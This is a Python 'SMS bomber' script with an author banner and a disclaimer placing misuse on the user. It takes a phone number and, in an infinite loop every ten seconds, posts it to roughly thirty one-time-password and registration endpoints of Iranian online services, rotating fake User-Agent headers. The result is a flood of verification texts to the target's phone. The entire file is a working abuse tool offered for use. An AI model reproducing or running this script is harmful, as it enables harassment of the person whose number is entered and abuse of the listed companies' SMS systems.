# AmirReza Dalir 

from colorama import Fore
import requests
import random
import time
from rich.console import Console
from rich.progress import track
from time import sleep

print(Fore.LIGHTBLUE_EX,'''

                         _      _____               _____       __      
         /\             (_)    |  __ \             |  __ \     | (_)     
        /  \   _ __ ___  _ _ __| |__) |___ ______ _| |  | | ___| |_ _ __ 
       / /\ \ | '_ ` _ \| | '__|  _  // _ \_  / _` | |  | |/ _ \ | | '__|
      / ____ \| | | | | | | |  | | \ \  __// / (_| | |__| |  __/ | | |   
     /_/    \_\_| |_| |_|_|_|  |_|  \_\___/___\__,_|_____/ \___|_|_|_|   ''') 

print(Fore.MAGENTA,'''
        |=====================================|
        |  Programmer: AmirRezaDelir          |
        |  Email: AmirRezaDelir@hotmail.com   |
        |  Instagram: AmirReza_Delir          |
        |  https://github.com/AmirRezaDelir   |
        |=====================================|
''')

console = Console()
console.rule("[bold Blue]App Version 20.23")
def process_data():
    sleep(0.02)
for _ in track(range(100), description='[green]Loading'):
    process_data()

console.rule("[bold Purple]English")
print(Fore.LIGHTRED_EX,"The user is responsible for any misuse of this software.")

console.rule("[bold Purple]Persian")
print(Fore.LIGHTRED_EX,"hr gvnh sv astfadh az ain nrmafzar bh ehdh shoma karbr ast.")

console.rule("[bold red]SMS BOMBER")
def process_data():
    sleep(0.02)
for _ in track(range(100), description='[green]Loading'):
    process_data()

number = input(Fore.LIGHTCYAN_EX+"Enter your phone number without the "+Fore.LIGHTRED_EX+"0 "+Fore.LIGHTCYAN_EX+": ")

url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone":number}

url_mobit = "https://api.mobit.ir/api/web/v8/register/register"
json_mobit = {"number":"0"+number}

url_sheypoor = "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sheypoor = {"username":number}

url_timch = "https://api.timcheh.com/auth/otp/send"
json_timch = {"mobile":"0"+number}

url_fafait = "https://api2.fafait.net/oauth/check-user"
json_fafait = {"id":number}

url_lioncomputer = "https://www.lioncomputer.com/api/v1/auth/send-register-code"
json_lioncomputer = {"mobile":"0"+number}

url_alibaba = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba = {"phoneNumber":number}

url_trip = "https://gateway.trip.ir/api/Totp"
json_trip = {"PhoneNumber":"0"+number}

url_eligasht = "https://www.eligasht.com/Authentication/register"
json_eligasht = {"username":"0"+number}

url_baninopc = "https://baninopc.com/backend/api/oauth/otp"
json_baninopc = {"mobileNumber":"0"+number}

url_delino = "https://www.delino.com/user/register"
json_delino = {"mobile":"0"+number}

url_gallery = "https://www.kia-gallery.com/fa/user/availableMobileNumber"
json_gallery = {"mobile":"0"+number}

url_zoodex = "https://admin.zoodex.ir/api/v1/login/check"
json_zoodex = {"mobile":"0"+number}

url_snappfood = "https://api.snappfood.biz/v1/otp"
json_snappfood = {"Phone":"0"+number}

url_sahmeto = "https://api.sahmeto.com/api/v1/auth/login"
json_sahmeto = {"ID":number}

url_daapapp = "https://api.daapapp.com/api/v2/client/otp/sms/send"
json_daapapp = {"mobile":"0"+number}

url_jabama = "https://taraazws.jabama.com/api/v4/account/send-code"
json_jabama = {"mobile":"0"+number}

url_zarinpal = "https://next.zarinpal.com/api/oauth/initialize"
json_zarinpal = {"username":"0"+number}

url_mobit = "https://api.mobit.ir/api/web/v8/register/register"
json_mobit = {"number":"0"+number}

url_ewano = "https://api-ebcom.mci.ir/services/auth/v1.0/otp"
json_ewano = {"msisdn":number+""}

url_accsell = "https://accsell.ir/api/v1/sessions/login_request"
json_accsell = {"mobile_phone":number}

url_corumofficial = "https://backend.corumofficial.com/web-api/login"
json_corumofficial = {"mobile":"0"+number} 

url_basalam = "https://auth.basalam.com/otp-request"
json_basalam = {"mobile":"0"+number} 

url_hamrah_mechanic = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
json_hamrah_mechanic = {"PhoneNumber":number}

url_pindo = "https://api.pindo.ir/v1/user/login-register/"
json_pindo = {"phone":number}

url_karnameh = "https://api.karnameh.com/v1/carinspection/auth/authenticate"
json_karnameh = {"phone":number}

url_bit24 = "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile"
json_bit24 = {"mobile":"0"+number}

url_arzinja = "https://arzinja.app/api/login?"
json_arzinja = {"mobile":"0"+number}

url_pooleno = "https://api.pooleno.ir/v1/auth/check-mobile"
json_pooleno = {"mobile":"0"+number}

heads = [
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4102.0 Safari/537.36',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0 SEB',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Accept': '*/*'
    },
    ]

while True:
    random_head = random.choice(heads)
    
    req1 = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print(req1)
    
    req2 = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print(req2)
    
    req3 = requests.post(url_mobit,json=json_mobit,headers=random_head)
    print(req3)
    
    req4 = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
    print(req4)
    
    req5 = requests.post(url=url_timch,json=json_timch,headers=random_head)
    print(req5)
    
    req6 = requests.post(url=url_fafait,json=json_fafait,headers=random_head)
    print(req6)
    
    req7 = requests.post(url=url_lioncomputer,json=json_lioncomputer,headers=random_head)
    print(req7)
    
    req8 = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head)
    print(req8)
    
    req9 = requests.post(url=url_trip,json=json_trip,headers=random_head)
    print(req9)
    
    req10 = requests.post(url=url_eligasht,json=json_eligasht,headers=random_head)
    print(req10)
    
    req11 = requests.post(url=url_baninopc,json=json_baninopc,headers=random_head)
    print(req11)
    
    req12 = requests.post(url=url_delino,json=json_delino,headers=random_head)
    print(req12)
    
    req13 = requests.post(url=url_gallery,json=json_gallery,headers=random_head)
    print(req13)
    
    req14 = requests.post(url=url_zoodex,json=json_zoodex,headers=random_head)
    print(req14)
    
    req15 = requests.post(url=url_snappfood,json=json_snappfood,headers=random_head)
    print(req15)
    
    req16 = requests.post(url=url_sahmeto,json=json_sahmeto,headers=random_head)
    print(req16)
    
    req17 = requests.post(url=url_daapapp,json=json_daapapp,headers=random_head)
    print(req17)
    
    req18 = requests.post(url=url_jabama,json=json_jabama,headers=random_head)
    print(req18)
    
    req19 = requests.post(url=url_zarinpal,json=json_zarinpal,headers=random_head)
    print(req19)
    
    req20 = requests.post(url=url_mobit,json=json_mobit,headers=random_head)
    print(req20)

    req21 = requests.post(url=url_ewano,json=json_ewano,headers=random_head)
    print(req21)
    
    req22 = requests.post(url=url_accsell,json=json_accsell,headers=random_head)
    print(req22)
    
    req23 = requests.post(url=url_corumofficial,json=json_corumofficial,headers=random_head)
    print(req23) 
    
    req24 = requests.post(url=url_basalam,json=json_basalam,headers=random_head)
    print(req24) 

    req25 = requests.post(url=url_hamrah_mechanic,json=json_hamrah_mechanic,headers=random_head)
    print(req25)

    req26 = requests.post(url=url_pindo,json=json_pindo,headers=random_head)
    print(req26)

    req27 = requests.post(url=url_karnameh,json=json_karnameh,headers=random_head)
    print(req27)

    req28 = requests.post(url=url_bit24,json=json_bit24,headers=random_head)
    print(req28)

    req29 = requests.post(url=url_arzinja,json=json_arzinja,headers=random_head)
    print(req29)

    req30 = requests.post(url=url_pooleno,json=json_pooleno,headers=random_head)
    print(req30)

    time.sleep(10)